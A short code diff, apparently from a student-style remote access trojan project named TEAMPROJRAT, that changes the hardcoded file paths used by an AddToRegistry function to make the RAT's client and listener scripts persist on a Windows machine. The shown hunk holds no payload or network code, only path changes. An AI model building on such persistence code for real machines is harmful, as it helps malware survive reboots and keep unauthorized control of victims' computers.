@@ -14,8 +14,8 @@ def AddToRegistry():
     #pth = os.path.dirname(os.path.realpath(__file__))
       
     # name of the python file with extension 
-    s_name="%homepath%\\Desktop\\TEAMPROJRAT-persistence\\persistence\\UDP_Connection\\client.py"
-    s_name2= "%homepath%\\Desktop\\TEAMPROJRAT-persistence\\persistence\\UDP_Connection\\clientlistener.py"     
+    s_name="C:\\Users\\IEUser\\Desktop\\TEAMPROJRAT\\UDP_Connection\\client.py"
+    s_name2= "C:\\Users\\IEUser\\Desktop\\TEAMPROJRAT\\UDP_Connection\\clientlistener.py"     
       
     # joins the file name to end of path address 
     address=os.path.join(s_name)  
